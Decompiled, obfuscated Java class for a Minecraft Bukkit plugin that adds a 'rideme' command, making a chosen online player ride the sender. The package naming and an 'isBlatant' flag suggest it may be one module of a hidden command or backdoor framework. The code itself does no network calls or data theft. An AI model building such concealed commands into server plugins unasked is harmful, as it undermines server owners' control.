/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Entity
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Entity;
import org.bukkit.entity.Player;

public class RidemeCommand
extends Command {
    @Override
    public void execute(Core lllllllllllllllIllllllIIIIlIlIll, String lllllllllllllllIllllllIIIIlIlIlI, String[] lllllllllllllllIllllllIIIIlIlIIl, Player lllllllllllllllIllllllIIIIlIIllI) {
        if (lllllllllllllllIllllllIIIIlIlIIl.length <= 1) {
            lllllllllllllllIllllllIIIIlIIllI.sendMessage(Settings.USAGE("rideme <player>"));
        } else {
            Player lllllllllllllllIllllllIIIIlIllIl = Bukkit.getServer().getPlayer(lllllllllllllllIllllllIIIIlIlIIl[1]);
            if (lllllllllllllllIllllllIIIIlIllIl == null) {
                lllllllllllllllIllllllIIIIlIIllI.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The player ").append(Settings.RED).append(lllllllllllllllIllllllIIIIlIlIIl[1]).append(Settings.WHITE).append(" is not online."))));
            } else if (lllllllllllllllIllllllIIIIlIllIl.getName().equals(lllllllllllllllIllllllIIIIlIIllI.getName())) {
                lllllllllllllllIllllllIIIIlIIllI.sendMessage(Settings.PREFIX("You cannot make yourself ride yourself!"));
            } else {
                lllllllllllllllIllllllIIIIlIIllI.setPassenger((Entity)lllllllllllllllIllllllIIIIlIllIl);
                lllllllllllllllIllllllIIIIlIIllI.sendMessage(String.valueOf(new StringBuilder().append(Settings.RED).append(Settings.PREFIX(String.valueOf(new StringBuilder().append(lllllllllllllllIllllllIIIIlIllIl.getName()).append(Settings.WHITE).append(" is now riding you!"))))));
            }
        }
    }

    @Override
    public boolean isBlatant() {
        return true;
    }

    public RidemeCommand() {
        RidemeCommand lllllllllllllllIllllllIIIIllIIIl;
    }
}

